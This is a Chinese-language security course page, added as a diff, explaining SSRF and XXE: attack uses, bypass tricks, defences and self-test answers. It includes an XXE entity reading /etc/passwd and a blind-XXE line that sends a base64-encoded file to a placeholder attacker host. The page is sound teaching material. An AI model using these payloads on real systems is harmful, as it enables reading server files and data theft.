@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>52 · SSRF与XXE漏洞 | tongui 的安全笔记</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="SSRF 与 XXE 漏洞 ⭐ 一句话总结:SSRF 是”让服务器替你去访问任意网址”,借此探测&#x2F;攻击内网;XXE 是”XML 外部实体注入”,能读服务器文件甚至执行代码——两者都常靠无回显时的”数据外带”来证明。  学习目标 理解 SSRF 原理、用途与挖掘点 掌握 SSRF 绕过与防御 理解 XXE 原理与利用 掌握 XXE 无回显处理方式  一、SSRF 是什么 全称 Server">
+<meta property="og:type" content="website">
+<meta property="og:title" content="52 · SSRF与XXE漏洞">
+<meta property="og:url" content="https://tongui66.github.io/course-notes/chapter2-web-vulns/52-SSRF%E4%B8%8EXXE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="tongui 的安全笔记">
+<meta property="og:description" content="SSRF 与 XXE 漏洞 ⭐ 一句话总结:SSRF 是”让服务器替你去访问任意网址”,借此探测&#x2F;攻击内网;XXE 是”XML 外部实体注入”,能读服务器文件甚至执行代码——两者都常靠无回显时的”数据外带”来证明。  学习目标 理解 SSRF 原理、用途与挖掘点 掌握 SSRF 绕过与防御 理解 XXE 原理与利用 掌握 XXE 无回显处理方式  一、SSRF 是什么 全称 Server">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-08T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-08T01:54:51.774Z">
+<meta property="article:author" content="tongui">
+<meta property="article:tag" content="Web安全, 渗透测试, CTF, SQL注入, XSS, 内网渗透, 应急响应, 安全笔记">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="tongui 的安全笔记" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a href="/" id="logo" class="nav-logo">tongui 的安全笔记</a>
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/security-notes/">安全笔记</a>
+        
+          <a class="main-nav-link" href="/course-notes/">课程</a>
+        
+          <a class="main-nav-link" href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">CTF题解</a>
+        
+          <a class="main-nav-link" href="/tools">工具</a>
+        
+          <a class="main-nav-link" href="/projects">项目</a>
+        
+          <a class="main-nav-link nav-resume" href="/resume">简历</a>
+        
+          <a class="main-nav-link" href="/about">关于我</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          
+            <a class="nav-icon" target="_blank" rel="noopener" href="https://github.com/tongui66"><span class="fa fa-github"></span></a>
+          
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://tongui66.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="page-" class="h-entry article article-type-page" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/course-notes/chapter2-web-vulns/52-SSRF%E4%B8%8EXXE%E6%BC%8F%E6%B4%9E/index.html" class="article-date">
+  <time class="dt-published" datetime="2026-08-08T02:00:00.000Z" itemprop="datePublished">2026-08-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      52 · SSRF与XXE漏洞
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SSRF-与-XXE-漏洞"><a href="#SSRF-与-XXE-漏洞" class="headerlink" title="SSRF 与 XXE 漏洞"></a>SSRF 与 XXE 漏洞</h1><blockquote>
+<p>⭐ <strong>一句话总结</strong>:SSRF 是”让服务器替你去访问任意网址”,借此探测&#x2F;攻击内网;XXE 是”XML 外部实体注入”,能读服务器文件甚至执行代码——两者都常靠无回显时的”数据外带”来证明。</p>
+</blockquote>
+<h2 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h2><ul>
+<li>理解 SSRF 原理、用途与挖掘点</li>
+<li>掌握 SSRF 绕过与防御</li>
+<li>理解 XXE 原理与利用</li>
+<li>掌握 XXE 无回显处理方式</li>
+</ul>
+<h2 id="一、SSRF-是什么"><a href="#一、SSRF-是什么" class="headerlink" title="一、SSRF 是什么"></a>一、SSRF 是什么</h2><ul>
+<li>全称 Server-Side Request Forgery(服务端请求伪造)。</li>
+<li>原理:攻击者提交任意 URL,服务端用 curl&#x2F;file 等去请求该 URL,并把结果返回。</li>
+<li>本质:请求由<strong>服务端</strong>发起,可以访问外网无法直接访问的<strong>内网资源</strong>。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者 → 目标Web服务器(SSRF) → 内网主机/端口/文件</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>2021 OWASP Top 10 第 10 名。</li>
+</ul>
+<h2 id="二、SSRF-能干什么"><a href="#二、SSRF-能干什么" class="headerlink" title="二、SSRF 能干什么"></a>二、SSRF 能干什么</h2><ol>
+<li><strong>内网主机&#x2F;端口探测</strong>:改 URL 为 <code>http://内网IP:端口</code>,看响应差异判断端口是否开放。</li>
+<li><strong>指纹识别</strong>:访问内网服务端口,从 banner&#x2F;响应判断 MySQL&#x2F;Nginx 等版本。</li>
+<li><strong>读取本地文件</strong>:用 <code>file:///etc/passwd</code>、<code>file:///C:/1.txt</code>。</li>
+<li><strong>攻击内网主机</strong>:配合内网工具漏洞(如 HFS 8080 的 RCE),让服务器替自己打内网。</li>
+<li>配合远程文件包含,加载攻击者脚本自动扫内网。</li>
+</ol>
+<h2 id="三、挖掘位置"><a href="#三、挖掘位置" class="headerlink" title="三、挖掘位置"></a>三、挖掘位置</h2><ul>
+<li>网络图片上传(填图片 URL)</li>
+<li>URL 翻译&#x2F;转换、网页快照、在线预览</li>
+<li>远程加载资源&#x2F;下载功能、curl 功能点</li>
+<li>任何”提交网址,后台去请求”的功能</li>
+</ul>
+<p>测试:<code>?url=http://www.baidu.com</code> 看是否回显百度内容 → 存在 SSRF。</p>
+<h2 id="四、SSRF-绕过"><a href="#四、SSRF-绕过" class="headerlink" title="四、SSRF 绕过"></a>四、SSRF 绕过</h2><table>
+<thead>
+<tr>
+<th>方式</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>进制转换</td>
+<td><code>http://0xC0A80101/</code>(16 进制)、八进制</td>
+</tr>
+<tr>
+<td>IP 简写</td>
+<td><code>10.0.0.1</code> 写成 <code>10.1</code></td>
+</tr>
+<tr>
+<td>URL 解析漏洞</td>
+<td><code>http://www.baidu.com@192.168.1.1</code>(curl 以后面 IP 为准)</td>
+</tr>
+<tr>
+<td>重定向</td>
+<td>利用 302 跳转绕过域名限制</td>
+</tr>
+<tr>
+<td>短域名&#x2F;跳转服务</td>
+<td>用跳转绕过白名单</td>
+</tr>
+</tbody></table>
+<h2 id="五、SSRF-防御"><a href="#五、SSRF-防御" class="headerlink" title="五、SSRF 防御"></a>五、SSRF 防御</h2><ul>
+<li>过滤内网 IP 段(10&#x2F;172.16-31&#x2F;192.168&#x2F;127.0.0.1)</li>
+<li>限制协议(只允许 http&#x2F;https)</li>
+<li><strong>白名单</strong>:只允许访问指定域名&#x2F;路径(最佳)</li>
+<li>对返回内容甄别:检测敏感关键字不返回</li>
+<li>禁止重定向跟随、限制端口</li>
+</ul>
+<h2 id="六、XXE-是什么"><a href="#六、XXE-是什么" class="headerlink" title="六、XXE 是什么"></a>六、XXE 是什么</h2><ul>
+<li>全称 XML External Entity(XML 外部实体注入)。</li>
+<li>XML 通过 DTD 定义实体,<code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> 可读取外部资源。</li>
+<li>位置:XML 解析功能(如文件上传、接口提交 XML 数据)。</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="七、XXE-利用"><a href="#七、XXE-利用" class="headerlink" title="七、XXE 利用"></a>七、XXE 利用</h2><ul>
+<li>有回显:直接读文件内容。</li>
+<li>无回显(盲 XXE)两种处理:<ol>
+<li><strong>报错信息</strong>:让解析报错,把文件内容带进报错中。</li>
+<li><strong>数据外带</strong>:把读取内容作为请求参数发到攻击者服务器,再查日志&#x2F;接收端:</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=1.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://攻击机/?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>攻击者通过访问日志收到 base64 编码的敏感文件数据。</li>
+</ul>
+<h2 id="八、XXE-危害与防御"><a href="#八、XXE-危害与防御" class="headerlink" title="八、XXE 危害与防御"></a>八、XXE 危害与防御</h2><ul>
+<li>危害:读任意文件、端口扫描、内网探测、SSRF、甚至 RCE(能执行命令的组件)。</li>
+<li>防御:<ul>
+<li>升级 XML 解析库版本</li>
+<li>代码禁用外部实体(PHP:<code>libxml_disable_entity_loader(true)</code>;Java&#x2F;Python 对应配置)</li>
+<li>白名单校验上传的 XML 内容</li>
+</ul>
+</li>
+</ul>
+<h2 id="九、重点速记"><a href="#九、重点速记" class="headerlink" title="九、重点速记"></a>九、重点速记</h2><ul>
+<li>SSRF&#x3D;服务端替攻击者发请求;主要探测内网&#x2F;读文件&#x2F;打内网</li>
+<li>挖点:URL 上传、翻译、预览等”提交网址”功能</li>
+<li>绕过:进制、IP 简写、@符号、重定向</li>
+<li>防御:白名单+限制协议+过滤内网 IP</li>
+<li>XXE&#x3D;XML 外部实体注入;有回显读文件,无回显靠报错&#x2F;外带</li>
+<li>防御:升级库+禁用外部实体</li>
+</ul>
+<h2 id="自测题"><a href="#自测题" class="headerlink" title="自测题"></a>自测题</h2><ol>
+<li>SSRF 和 CSRF 有什么区别?</li>
+<li>SSRF 主要能干什么?</li>
+<li>SSRF 常见挖掘位置?</li>
+<li>内网 IP 段有哪些?</li>
+<li>SSRF 绕过方式有哪些?</li>
+<li>SSRF 最好的防御是什么?</li>
+<li>XXE 漏洞是怎么产生的?</li>
+<li>盲 XXE 怎么拿到数据?</li>
+<li>XXE 危害有哪些?</li>
+<li>XXE 怎么防御?</li>
+</ol>
+<details><summary>参考答案</summary>
+1. CSRF 借用户浏览器发请求,SSRF 让服务器替攻击者发请求。<br>
+2. 内网探测、指纹识别、读文件、攻击内网主机。<br>
+3. 网络图片上传、URL 翻译/预览、远程加载等提交网址的功能。<br>
+4. 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、127.0.0.1。<br>
+5. 进制转换、IP 简写、@符号解析、重定向。<br>
+6. 白名单限定可访问的域名/路径。<br>
+7. 解析 XML 时允许外部实体,攻击者用实体读取本地文件。<br>
+8. 让目标报错带出数据,或把数据外带到攻击者服务器日志。<br>
+9. 读文件、端口扫描、SSRF、内网攻击、甚至 RCE。<br>
+10. 升级解析库版本并禁用外部实体。<br>
+</details>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tongui66.github.io/course-notes/chapter2-web-vulns/52-SSRF%E4%B8%8EXXE%E6%BC%8F%E6%B4%9E/index.html" data-id="cuid9KRvyVPvNskn7DT1BrsI7" data-title="52 · SSRF与XXE漏洞" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">上传</a> <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 10px;">代理</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a> <a href="/tags/%E5%BA%94%E6%80%A5/" style="font-size: 10px;">应急</a> <a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 10px;">护网</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">报告</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E6%9F%A5%E6%9D%80/" style="font-size: 10px;">查杀</a> <a href="/tags/%E6%B5%81%E7%A8%8B/" style="font-size: 10px;">流程</a> <a href="/tags/%E7%AD%89%E4%BF%9D/" style="font-size: 10px;">等保</a> <a href="/tags/%E9%9A%A7%E9%81%93/" style="font-size: 10px;">隧道</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a> <a href="/tags/%E9%A2%98%E5%BA%93/" style="font-size: 10px;">题库</a> <a href="/tags/%E9%AB%98%E9%A2%91/" style="font-size: 10px;">高频</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95/">面试</a><span class="category-list-count">1</span></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">六月 2026</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/security-notes/interview-100/">面试高频问答 100 题</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/incident-response/">应急响应速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/intranet-domain/">内网渗透与域渗透速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/pentest-checklist/">渗透测试全流程速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/payload-handbook/">Web 漏洞速查与 Payload 手册</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 tongui<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/security-notes/" class="mobile-nav-link">安全笔记</a>
+  
+    <a href="/course-notes/" class="mobile-nav-link">课程</a>
+  
+    <a href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95" class="mobile-nav-link">CTF题解</a>
+  
+    <a href="/tools" class="mobile-nav-link">工具</a>
+  
+    <a href="/projects" class="mobile-nav-link">项目</a>
+  
+    <a href="/resume" class="mobile-nav-link">简历</a>
+  
+    <a href="/about" class="mobile-nav-link">关于我</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script>
+  (function(){
+    var path = location.pathname.replace(/\/+$/, '') || '/';
+    var links = document.querySelectorAll('#main-nav .main-nav-link');
+    var best = null, bestLen = -1;
+    for (var i = 0; i < links.length; i++){
+      var href = links[i].getAttribute('href') || '';
+      href = href.replace(/\/+$/, '') || '/';
+      var hit = (href === '/' ? path === '/' : (path === href || path.indexOf(href + '/') === 0));
+      if (hit && href.length > bestLen){
+        bestLen = href.length;
+        best = links[i];
+      }
+    }
+    if (best){
+      best.classList.add('current');
+    }
+  })();
+</script>
+
+
+
+
+
+
+  </div>
+</body>
+</html>
